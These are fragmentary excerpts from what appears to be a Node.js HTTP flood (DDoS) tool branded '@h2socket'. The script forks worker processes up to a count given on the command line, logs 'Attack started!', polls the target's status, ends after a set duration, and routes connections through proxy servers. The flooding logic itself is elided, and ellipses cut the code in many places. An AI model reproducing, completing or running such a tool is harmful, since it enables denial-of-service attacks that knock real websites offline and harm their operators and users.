 ...
 const getCurrentTime = () => {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(`${getCurrentTime()} [C-MAY]  title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request timeout | @h2socket') {
        console.log(`${getCurrentTime()} [C-MAY] Request timeout`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`${getCurrentTime()} [C-MAY]  title: ${extractedTitle} `);
      } else {
        console.log(`${getCurrentTime()} [C-MAY]  ${error.message}`);
      }
    });
}
...
`);
  ...
  for (let i = 1; i <= process.argv[5]; i++){
    cluster.fork();
    console.log(`${getCurrentTime()} [C-MAY] New worker:  ${i} | @h2socket`);
  }
  console.log(`${getCurrentTime()} [C-MAY] Attack started! `);
  setInterval(getStatus, 2000);
  setTimeout(() => {
    console.log(`${getCurrentTime()} [C-MAY] Attack ended `);
    process.exit(1);
  }, process.argv[3] * 1000);
} 
 ...
 class NetSocket {
  ...
  HTTP(options, callback) {
     ...
     connection.on("data", chunk => {
         ...
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "Error : Invalid response from proxy server | @h2socket");
         }
     ...
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "Error: Request Timeout | @h2socket");
     });
